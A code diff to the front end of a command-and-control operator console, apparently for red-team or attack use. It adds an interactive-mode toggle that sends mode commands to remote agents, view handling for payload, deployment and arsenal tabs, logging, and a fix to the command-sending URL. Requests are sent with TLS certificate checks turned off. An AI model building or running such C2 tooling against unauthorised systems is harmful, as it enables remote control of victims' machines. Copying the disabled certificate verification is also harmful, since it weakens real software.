@@ -3,6 +3,8 @@ const axios = require('axios');
 const { Terminal } = require('xterm');
 const { FitAddon } = require('xterm-addon-fit');
 
+// Deployment module will be loaded via script tag
+
 //============================================================================
 // Global State
 //============================================================================
@@ -10,6 +12,8 @@ const { FitAddon } = require('xterm-addon-fit');
 let c2ServerURL = '';
 let authToken = '';
 let connected = false;
+// Make state globally accessible for other modules (arsenal.js)
+window.selectedAgentId = '';
 let selectedAgentId = '';
 let pollingInterval = null;
 let agents = [];
@@ -19,10 +23,36 @@ let agents = [];
 //============================================================================
 
 document.addEventListener('DOMContentLoaded', () => {
+    console.log('============================================================');
+    console.log('RAMP GUI Controller - Application Starting');
+    console.log('============================================================');
+
+    console.log('[INIT] Initializing event listeners...');
     initializeEventListeners();
+
+    console.log('[INIT] Initializing terminal...');
     initializeTerminal();
+
+    // Initialize deployment tab if available
+    console.log('[INIT] Checking for deployment module...');
+    if (typeof initDeployment === 'function') {
+        console.log('[INIT] Deployment module found, initializing...');
+        try {
+            initDeployment();
+        } catch (error) {
+            console.error('[INIT] ERROR initializing deployment:', error);
+        }
+    } else {
+        console.warn('[INIT] WARNING: initDeployment function not found');
+    }
+
+    console.log('[INIT] Loading settings...');
     loadSettings();
+
     logActivity('Application started');
+    console.log('============================================================');
+    console.log('RAMP GUI Controller - Initialization Complete');
+    console.log('============================================================');
 });
 
 //============================================================================
@@ -45,12 +75,60 @@ function initializeEventListeners() {
     // Connect button
     document.getElementById('connectBtn').addEventListener('click', connectToC2);
 
+    // Interactive Mode Toggle
+    const toggleBurstBtn = document.getElementById('toggleBurstMode');
+    if (toggleBurstBtn) {
+        toggleBurstBtn.addEventListener('click', async () => {
+            if (!window.selectedAgentId) return;
+
+            const isBurst = toggleBurstBtn.classList.contains('active');
+            const newMode = isBurst ? 'normal' : 'burst';
+            const cmd = `set-mode ${newMode}`;
+
+            try {
+                const https = require('https');
+                const httpsAgent = new https.Agent({ rejectUnauthorized: false });
+
+                await axios.post(`${c2ServerURL}/api/agents/${window.selectedAgentId}/command`, {
+                    command: cmd
+                }, {
+                    headers: { 'Authorization': `Bearer ${authToken}` },
+                    httpsAgent: httpsAgent
+                });
+
+                showNotification('Success', `Switched to ${newMode} mode`);
+
+                // Optimistic UI update
+                if (newMode === 'burst') {
+                    toggleBurstBtn.classList.add('active');
+                    toggleBurstBtn.classList.remove('btn-secondary');
+                    toggleBurstBtn.classList.add('btn-success'); // Assuming btn-success exists or use custom style
+                    toggleBurstBtn.innerText = '⚡ Interactive Mode: ON';
+                    toggleBurstBtn.style.backgroundColor = '#50fa7b';
+                    toggleBurstBtn.style.color = '#000';
+                } else {
+                    toggleBurstBtn.classList.remove('active');
+                    toggleBurstBtn.classList.add('btn-secondary');
+                    toggleBurstBtn.classList.remove('btn-success');
+                    toggleBurstBtn.innerText = '⚡ Interactive Mode: OFF';
+                    toggleBurstBtn.style.backgroundColor = '';
+                    toggleBurstBtn.style.color = '';
+                }
+
+            } catch (error) {
+                console.error('Failed to toggle mode:', error);
+                showNotification('Error', `Failed to toggle mode: ${error.message}`);
+            }
+        });
+    }
+
     // Refresh agents
     document.getElementById('refreshAgentsBtn').addEventListener('click', loadAgents);
 
     // Agent selection in terminal
     document.getElementById('agentSelect').addEventListener('change', (e) => {
         selectedAgentId = e.target.value;
+        window.selectedAgentId = selectedAgentId; // Sync global
         if (selectedAgentId && term) {
             term.clear();
             const agent = agents.find(a => a.agent_id === selectedAgentId);
@@ -86,6 +164,12 @@ function initializeEventListeners() {
 
     // Settings
     document.getElementById('saveSettingsBtn').addEventListener('click', saveSettings);
+
+    // Global Context Menu (Right-Click)
+    window.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        ipcRenderer.send('show-context-menu');
+    });
 }
 
 //============================================================================
@@ -93,30 +177,51 @@ function initializeEventListeners() {
 //============================================================================
 
 function switchView(viewName) {
+    console.log(`[switchView] Switching to: ${viewName}`);
+
     // Hide all views
-    document.querySelectorAll('.view').forEach(view => view.classList.remove('active'));
-    document.querySelectorAll('.content-section').forEach(section => section.style.display = 'none');
+    // Hide all views
+    const views = ['dashboard', 'agents', 'terminal', 'files', 'payload', 'deployment', 'arsenal', 'tools', 'settings'];
+    views.forEach(view => {
+        const element = document.getElementById(`${view}View`);
+        if (element) {
+            element.classList.remove('active');
+        }
+        const sectionElement = document.getElementById(`${view}-section`);
+        if (sectionElement) {
+            sectionElement.style.display = 'none';
+        }
+    });
 
     // Show selected view
-    const viewElement = document.getElementById(`${viewName}View`);
-    const sectionElement = document.getElementById(`${viewName}-section`);
+    const selectedView = document.getElementById(`${viewName}View`);
+    console.log(`[switchView] Selected view element:`, selectedView);
+    console.log(`[switchView] Has content:`, selectedView ? selectedView.innerHTML.length : 0);
 
-    if (viewElement) {
-        viewElement.classList.add('active');
-    }
-    if (sectionElement) {
-        sectionElement.style.display = 'block';
+    if (selectedView) {
+        selectedView.classList.add('active');
+        console.log(`[switchView] Added 'active' class to ${viewName}View`);
+        console.log(`[switchView] Display style:`, window.getComputedStyle(selectedView).display);
+    } else {
+        console.error(`[switchView] Could not find element: ${viewName}View`);
     }
 
-    // Update header title
+    const selectedSection = document.getElementById(`${viewName}-section`);
+    if (selectedSection) {
+        selectedSection.style.display = 'block';
+    }
+
+    // Update title
     const titles = {
-        'dashboard': 'Dashboard',
-        'agents': 'Agents',
-        'terminal': 'Terminal',
-        'files': 'File Transfer',
-        'payload': 'Payload Generator',
-        'tools': 'Tools',
-        'settings': 'Settings'
+        dashboard: 'Dashboard',
+        agents: 'Agents',
+        terminal: 'Terminal',
+        files: 'File Transfer',
+        payload: 'Payload Generator',
+        deployment: 'Deployment Manager',
+        arsenal: 'Advanced Arsenal',
+        tools: 'Tools',
+        settings: 'Settings'
     };
 
     document.getElementById('viewTitle').textContent = titles[viewName] || viewName;
@@ -312,6 +417,7 @@ function updateAgentSelectors() {
 
 function selectAgent(agentId) {
     selectedAgentId = agentId;
+    window.selectedAgentId = agentId; // FIX: Sync global state
     switchView('terminal');
     document.getElementById('agentSelect').value = agentId;
     const agent = agents.find(a => a.agent_id === agentId);
@@ -333,7 +439,7 @@ async function sendCommand(agentId, command) {
         });
 
         const response = await axios.post(
-            `${c2ServerURL} /api/agents / ${agentId}/command`,
+            `${c2ServerURL}/api/agents/${agentId}/command`,
             { command },
             {
                 headers: { 'Authorization': `Bearer ${authToken}` },
